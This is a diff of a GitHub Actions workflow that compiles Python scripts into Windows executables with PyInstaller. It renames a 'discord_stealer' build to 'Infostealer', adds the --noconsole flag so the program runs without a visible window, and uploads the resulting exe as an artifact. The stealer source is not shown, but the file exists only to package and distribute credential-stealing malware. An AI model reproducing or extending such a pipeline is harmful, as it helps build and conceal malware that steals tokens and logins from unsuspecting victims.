@@ -1,4 +1,4 @@
-
+name: Build Infostealer
 
 on:
   push:
@@ -14,12 +14,12 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
 
-    - name: Set up Node.js 24
+    - name: Setup Node.js 24
       uses: actions/setup-node@v4
       with:
-        node-version: '24'  # Updated to Node.js 24
+        node-version: '24'
 
-    - name: Set up Python (for PyInstaller)
+    - name: Setup Python 3.10
       uses: actions/setup-python@v5
       with:
         python-version: '3.10'
@@ -29,16 +29,12 @@ jobs:
         python -m pip install --upgrade pip
         pip install pyinstaller psutil requests
 
-    - name: Install Node.js dependencies (optional)
+    - name: Build EXE
       run: |
-        npm install
-
-    - name: Build EXE with PyInstaller
-      run: |
-        pyinstaller --onefile --name discord_stealer discord_stealer.py
+        pyinstaller --onefile --noconsole --name Infostealer stealer.py
 
     - name: Upload Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: discord_stealer_exe
-        path: dist/discord_stealer.exe
+        name: Infostealer
+        path: dist/Infostealer.exe
